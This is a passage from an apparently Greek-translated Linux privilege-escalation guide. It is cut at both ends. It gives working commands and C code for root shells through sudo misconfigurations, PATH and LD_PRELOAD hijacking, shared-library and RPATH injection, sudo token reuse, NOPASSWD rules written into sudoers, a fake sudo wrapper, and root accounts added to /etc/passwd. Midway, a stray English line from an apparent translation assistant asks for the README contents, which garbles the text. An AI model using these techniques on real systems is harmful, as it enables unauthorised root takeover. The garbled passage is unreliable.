bash -p                                # root shell via SUID bit
```
### Sudo: παράκαμψη διαδρομών εκτέλεσης
**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **symlinks**. Για παράδειγμα, στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί ένας **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντιμέτρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς διαδρομή εντολής

Εάν η **sudo άδεια** έχει δοθεί σε μία μόνο εντολή **χωρίς να καθοριστεί η διαδρομή**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή της (πάντα ελέγξτε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με καθορισμένη διαδρομή εντολής

Αν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να προσπαθήσετε να **εξαγάγετε μια συνάρτηση** με το όνομα της εντολής που καλεί το suid αρχείο.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_ πρέπει να προσπαθήσετε να δημιουργήσετε τη συνάρτηση και να την εξαγάγετε:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Τότε, όταν εκτελέσεις το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### Εγγράψιμο script που εκτελείται από SUID wrapper

Μια συνηθισμένη λανθασμένη ρύθμιση σε custom-app είναι ένα root-owned SUID binary wrapper που εκτελεί ένα script, ενώ το ίδιο το script είναι εγγράψιμο από low-priv users.

Τυπικό μοτίβο:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Εάν το `/usr/local/bin/backup.sh` είναι εγγράψιμο, μπορείτε να προσθέσετε payload commands και κατόπιν να εκτελέσετε τον SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Γρήγοροι έλεγχοι:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Αυτός ο δρόμος επίθεσης είναι ιδιαίτερα συχνός σε "maintenance"/"backup" wrappers που τοποθετούνται στο `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so files) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading a library.

Ωστόσο, για τη διατήρηση της ασφάλειας του συστήματος και για να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ειδικά σε **suid/sgid** executables, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί την **LD_PRELOAD** για executables όπου το real user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για executables με suid/sgid, μόνο βιβλιοθήκες σε standard paths που είναι επίσης suid/sgid προφορτώνονται.

Privilege escalation μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιέχει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμα και όταν οι εντολές εκτελούνται με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση arbitrary code με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθήκευσε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **compile it** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Μια παρόμοια privesc μπορεί να καταχραστεί εάν ο επιτιθέμενος ελέγχει την env variable **LD_LIBRARY_PATH** επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν εντοπίζετε ένα binary με **SUID** δικαιώματα που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγξετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να το εκμεταλλευτείτε, προχωράτε δημιουργώντας ένα αρχείο C, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην ανύψωση προνομίων με τη μεταβολή των δικαιωμάτων αρχείων και την εκτέλεση ενός shell με ανυψωμένα προνόμια.

Μεταγλωττίστε το παραπάνω C αρχείο σε ένα shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας ενδεχόμενη παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση που ονομάζεται `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να εκμεταλλευτούν ένας επιτιθέμενος για να παρακάμψει τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε arguments** σε μια εντολή.

Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να ξεφύγουν από restricted shells, να escalate ή να διατηρήσουν elevated privileges, να μεταφέρουν αρχεία, να spawn bind και reverse shells, και να διευκολύνουν άλλες εργασίες post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν μπορείτε να εκτελέσετε `sudo -l` μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει πώς να εκμεταλλευτεί οποιοδήποτε sudo rule.

### Reusing Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό, μπορείτε να escalate privileges περιμένοντας την εκτέλεση μιας εντολής sudo και στη συνέχεια hijacking the session token.

Απαιτήσεις για escalate privileges:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15mins** (από προεπιλογή αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε `sudo` χωρίς να εισάγουμε κανένα password)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας `/etc/sysctl.d/10-ptrace.conf` και θέτοντας `kernel.yama.ptrace_scope = 0`)

Αν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να escalate privileges χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **first exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **activate the sudo token in your session** (δεν θα πάρετε αυτόματα root shell, κάντε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **ιδιοκτησίας root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που κάνει **τα sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Εάν έχετε **write permissions** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που έχουν δημιουργηθεί μέσα σε αυτόν μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **create a sudo token for a user and PID**.\
Για παράδειγμα, αν μπορείτε να overwrite το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως ο εν λόγω χρήστης με PID 1234, μπορείτε να **obtain sudo privileges** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό, εκτελώντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και πώς. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, ενδέχεται να **αποκτήσετε μερικές ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα είστε σε θέση να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτήν την άδεια
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος να καταχραστείτε αυτά τα δικαιώματα:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές για το `sudo` binary όπως το `doas` για OpenBSD — θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Αν γνωρίζεις ότι ένας **χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί `sudo`** για να αυξήσει τα προνόμια και έχεις ένα shell εντός αυτού του context χρήστη, μπορείς να **δημιουργήσεις ένα νέο sudo εκτελέσιμο** που θα εκτελέσει τον κώδικά σου ως root και μετά την εντολή του χρήστη. Έπειτα, **τροποποίησε το $PATH** του context του χρήστη (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) ώστε όταν ο χρήστης εκτελέσει sudo, να εκτελείται το sudo εκτελέσιμό σου.

Σημείωσε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσεις άλλα αρχεία για να προσθέσεις το νέο path. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείς να βρεις άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία διαμόρφωσης**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις δηλωμένες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιοδήποτε φάκελο που αναφέρεται σε κάποιο αρχείο διαμόρφωσης μέσα στο `/etc/ld.so.conf.d/*.conf` μπορεί να είναι σε θέση να αποκτήσει αυξημένα προνόμια.\
Δες **πώς να εκμεταλλευτείς αυτήν τη λανθασμένη διαμόρφωση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αν αντιγράψετε τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια, δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων δικαιωμάτων root σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **δικαιώματα σε μικρότερες και διακριτές μονάδες**. Καθεμία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο μειώνεται το πλήρες σύνολο δικαιωμάτων, μειώνοντας τον κίνδυνο εκμετάλλευσης.\
Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα για τις capabilities και πώς να τις καταχραστείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για το "execute"** υπονοεί ότι ο αντίστοιχος χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
Το **"read"** bit σημαίνει ότι ο χρήστης μπορεί να **απαριθμήσει** τα **αρχεία**, και το **"write"** bit σημαίνει ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **υπερισχύει των παραδοσιακών ugo/rwx permissions**. Αυτά τα δικαιώματα βελτιώνουν τον έλεγχο πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες υπάρχουν [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα "read" και "write" σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λάβετε** αρχεία με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Κρυφή ACL backdoor σε sudoers drop-ins

Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο που ανήκει στο root στο `/etc/sudoers.d/` με δικαιώματα `440` που όμως εξακολουθεί να παρέχει write access σε έναν low-priv user μέσω ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Αν δείτε κάτι όπως `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τα περιοριστικά mode bits:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Αυτή είναι μια ιδιαίτερα επιδραστική ACL persistence/privesc διαδρομή, επειδή είναι εύκολο να παραβλεφθεί σε ανασκοπήσεις που βασίζονται αποκλειστικά σε `ls -l`.

## Ανοιχτές shell συνεδρίες

Σε **παλαιότερες εκδόσεις** μπορεί να **hijack** κάποια **shell** συνεδρία διαφορετικού χρήστη (**root**).\
Στις **νεότερες εκδόσεις** θα μπορείτε να **connect** μόνο σε screen sessions του **δικού σας χρήστη**. Ωστόσο, μπορεί να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Συνδέσου σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν πρόβλημα με τις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να hijack μια tmux (v2.1) session που δημιουργήθηκε από root ως χρήστης χωρίς προνόμια.

**Λίστα tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Συνδέσου σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** για παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε συστήματα βάσει Debian (Ubuntu, Kubuntu, κ.λπ.) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να έχουν επηρεαστεί από αυτό το bug.\
Αυτό το bug προκύπτει κατά τη δημιουργία νέου ssh key σε αυτά τα OS, καθώς **only 32,768 variations were possible**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ενδιαφέρουσες τιμές διαμόρφωσης

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται το password authentication. Η προεπιλεγμένη τιμή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται το public key authentication. Η προεπιλεγμένη τιμή είναι `yes`.
- **PermitEmptyPasswords**: Όταν το password authentication επιτρέπεται, καθορίζει αν ο server επιτρέπει login σε λογαριασμούς με κενές password συμβολοσειρές. Η προεπιλεγμένη τιμή είναι `no`.

### Login control files

Αυτά τα αρχεία επηρεάζουν ποιος μπορεί να κάνει login και πώς:

- **`/etc/nologin`**: αν υπάρχει, μπλοκάρει non-root logins και εκτυπώνει το μήνυμά του.
- **`/etc/securetty`**: περιορίζει από πού μπορεί ο root να κάνει login (TTY allowlist).
- **`/etc/motd`**: post-login banner (μπορεί να leak πληροφορίες για το environment ή maintenance).

### PermitRootLogin

Καθορίζει αν ο root μπορεί να κάνει login μέσω ssh, η προεπιλογή είναι `no`. Ενδεχόμενες τιμές:

- `yes`: root μπορεί να κάνει login χρησιμοποιώντας password και private key
- `without-password` ή `prohibit-password`: root μπορεί να κάνει login μόνο με private key
- `forced-commands-only`: root μπορεί να κάνει login μόνο με private key και εφόσον έχουν οριστεί οι command options
- `no`: όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, που θα αντικατασταθούν από το home directory. **You can indicate absolute paths** (που ξεκινούν με `/`) ή **relative paths from the user's home**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η διαμόρφωση θα δείξει ότι αν προσπαθήσετε να συνδεθείτε με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το **public key** του κλειδιού σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding σας επιτρέπει να **χρησιμοποιήσετε τα τοπικά σας SSH keys αντί να αφήνετε κλειδιά** (χωρίς passphrases!) στον server σας. Έτσι, θα μπορείτε να **μεταβείτε** μέσω ssh **σε ένα host** και από εκεί να **μεταβείτε σε άλλο** host **χρησιμοποιώντας** το **key** που βρίσκεται στον **αρχικό host**.

Πρέπει να ορίσετε αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μετακινείται σε διαφορετική μηχανή, αυτή η μηχανή θα μπορεί να έχει πρόσβαση στα κλειδιά (κάτι που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να αρνηθεί αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **αρνηθεί** το ssh-agent forwarding με την λέξη-κλειδί `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Σημαντικά Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά μπορείτε να escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρεθεί κάποιο περίεργο profile script πρέπει να το ελέγξετε για **ευαίσθητες πληροφορίες**.

### Passwd/Shadow αρχεία

Ανάλογα με το OS τα `/etc/passwd` και `/etc/shadow` αρχεία μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει backup. Επομένως συνιστάται να **βρείτε όλα τα αρχεία** και να **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή αντίστοιχο).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιουργήστε έναν κωδικό με μία από τις ακόλουθες εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md contents. Please paste the contents of src/linux-hardening/privilege-escalation/README.md you want translated. Also confirm if you want me to generate a password for the user `hacker` and include that password in the translated file.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν ψεύτικο χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να υποβαθμίσετε την τρέχουσα ασφάλεια του συστήματος.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και στο `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν το μηχάνημα τρέχει έναν **tomcat** server και μπορείτε να **modify the Tomcat service configuration file inside /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
